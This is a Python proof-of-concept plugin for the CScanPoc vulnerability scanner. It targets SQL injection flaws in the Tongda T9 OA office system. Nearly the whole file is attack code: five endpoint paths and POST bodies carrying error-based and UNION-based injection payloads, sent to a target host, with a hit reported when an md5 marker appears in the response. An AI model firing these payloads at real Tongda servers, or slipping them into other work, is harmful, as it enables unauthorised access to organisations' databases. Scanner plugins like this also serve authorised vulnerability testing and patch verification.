# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0012'  # 平台漏洞编号，留空
    name = '通达T9系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-13'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OAT9智能管理平台是基于B/S架构，灵活、稳定、安全、高性能的办公系统。采用自主研发的引擎技术，提供强大的工作流和公文流程管理功能，可完全根据客户需求定制办公门户平台。
        由于参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=082959'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd8a93e7e-56eb-4ca2-bf36-c2bb5d8f341e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0101037
            # refer2: http://www.wooyun.org/bugs/wooyun-2014-082959
            hh = hackhttp.hackhttp()
            # POST 型
            payloads = [
                '/t9/t9/core/funcs/doc/act/T9MyWorkAct/getMyWorkList.act?sortId=183239992%20oR%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)',
                '/t9/t9/core/funcs/message/weixun_share/act/T9WeiXunShareAct/getWeiXunById.act',
                '/t9/t9/core/funcs/diary/act/T9DiaryAct/deleteDia.act',
                '/t9/t9/core/funcs/email/act/T9EmailNameAct/saveName.act',
                '/t9/t9/core/funcs/email/act/T9EmailBoxAct/isBoxNameExist.act',
            ]
            posts = [
                'pageIndex=1&showLength=10&flowId=&typeStr=1&_=',
                'wxid=1\' UNION ALL SELECT NULL,md5(1),NULL,NULL,NULL,NULL,NULL#',
                'diaIds=2 AND (SELECT 4200 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)',
                'name=xxxx&IS_USE=1&IS_USE1=1&NAME_ID=4\' AND (SELECT 5610 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'1\'=\'1',
                'boxName=xxxxx\' AND (SELECT 4999 FROM(SELECT COUNT(*),CONCAT(md5(1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'VnVS\'=\'VnVS&boxId=1',
            ]
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
            for i in range(len(payloads)):
                url = self.target + payloads[i]
                code, head, res, err, _ = hh.http(url, post=posts[i])
                if code == 200 and md5_1 in res:
                    #security_hole(payload+' POST: '+posts[i]+' sql注入');
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
